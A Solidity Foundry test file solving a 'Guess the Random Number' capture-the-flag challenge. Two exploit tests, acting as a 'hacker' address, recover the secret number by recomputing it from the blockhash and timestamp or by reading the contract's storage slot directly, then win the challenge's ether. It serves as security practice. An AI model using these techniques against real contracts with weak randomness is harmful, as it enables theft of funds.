// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {GuessTheRandomNumberChallenge} from "src/Lotteries/GuessTheRandomNumberChallenge.sol";

contract GuessTheRandomNumberChallengeTest is Test {
    GuessTheRandomNumberChallenge public guessTheRandomNumberChallenge;
    uint256 deployBlockNumber;
    uint256 deployTime;

    address hacker = makeAddr("hacker");

    function setUp() public {
        payable(hacker).transfer(1 ether);

        guessTheRandomNumberChallenge = new GuessTheRandomNumberChallenge{value: 1 ether}();
        deployBlockNumber = block.number;
        deployTime = block.timestamp;
    }

    function testGuessTheRandomNumber1() public {
        console.log("my balance:", hacker.balance);
        console.log(
            "challenge balance:",
            address(guessTheRandomNumberChallenge).balance
        );

        // Suppose several blocks have passed
        vm.roll(deployBlockNumber + 10);

        uint8 answer =
            uint8(uint256(keccak256(abi.encodePacked(blockhash(deployBlockNumber - 1), deployTime))));
        console.log("answer:", answer);

        vm.startPrank(hacker);
        guessTheRandomNumberChallenge.guess{value: 1 ether}(answer);
        vm.stopPrank();

        console.log("my new balance:", hacker.balance);
        console.log(
            "challenge new balance:",
            address(guessTheRandomNumberChallenge).balance
        );

        assertTrue(guessTheRandomNumberChallenge.isComplete());
    }

    function testGuessTheRandomNumber2() public {
        console.log("my balance:", hacker.balance);
        console.log(
            "challenge balance:",
            address(guessTheRandomNumberChallenge).balance
        );

        uint256 answer =
            uint256(vm.load(address(guessTheRandomNumberChallenge), bytes32(uint256(0))));
        console.log("answer:", answer);

        vm.startPrank(hacker);
        guessTheRandomNumberChallenge.guess{value: 1 ether}(uint8(answer));
        vm.stopPrank();

        console.log("my new balance:", hacker.balance);
        console.log(
            "challenge new balance:",
            address(guessTheRandomNumberChallenge).balance
        );

        assertTrue(guessTheRandomNumberChallenge.isComplete());
    }
}